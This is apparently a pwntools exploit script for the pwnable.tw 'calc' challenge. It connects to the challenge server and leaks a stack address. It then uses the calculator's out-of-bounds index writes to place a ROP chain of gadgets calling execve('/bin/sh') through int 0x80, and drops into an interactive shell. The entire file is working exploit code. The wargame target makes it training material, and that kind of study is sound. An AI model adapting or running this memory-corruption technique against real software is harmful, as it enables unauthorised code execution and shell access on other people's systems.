p_eax = 0x0805c34b 		# : pop eax ; ret
p_edcbx = 0x080701d0 	# : pop edx ; pop ecx ; pop ebx ; ret
int0x80 = 0x08049a21 	# : int 0x80

# canary is offset 357 with number[0]
offset = ['+361', '+362', '+363', '+364', 
		 '+365', '+366', '+367', '+368', '+369']

payloads = [p_eax, 0x0b, p_edcbx, 0x0, 0x0, 0x0, 
		   int0x80, 0x6e69622f, 0x0068732f]

from pwn import *

elf = ELF("./calc")
# p = elf.process()
# context.log_level = 'debug'
# gdb.attach(p, gdbscript='''b *calc+152''')

p = remote("chall.pwnable.tw", "10100")


def leak_stack():
	p.recv(1024)
	p.sendline('+360')
	prev_ebp = int(p.recv(1024))
	payloads[5] = prev_ebp	# leak addr of /bin/sh

def rop():
	for i in range(len(payloads)):
		log.info('Target: %s' % hex(payloads[i]))
		p.sendline(offset[i])
		
		leak = int(p.recv(1024))
		log.info('Value leak: %s' % hex(leak))
		writeAdd = payloads[i] - leak
		log.info('Write add into stack: %d' % writeAdd)

		target = '%s%+d' % (offset[i], writeAdd)
		log.info('Send: %s' % target)
		p.sendline(target)

		log.success('==> Succes write into stack: %s\n=============================================\n' % hex(int(p.recv(1024))))


leak_stack()
rop()
p.send('\n')

p.interactive()
